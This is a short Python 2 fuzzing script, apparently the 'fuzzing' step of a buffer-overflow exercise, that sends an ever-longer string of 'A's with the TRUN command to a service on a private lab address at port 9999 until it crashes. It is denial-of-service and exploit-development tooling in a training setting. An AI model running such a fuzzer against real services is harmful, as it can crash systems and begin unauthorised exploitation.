2-Fuzzing

~~~python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(("192.168.253.129",9999))

		s.send(('TRUN /.:/' + buffer))
		s.close()
		buffer = buffer + "A" * 100

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()

~~~

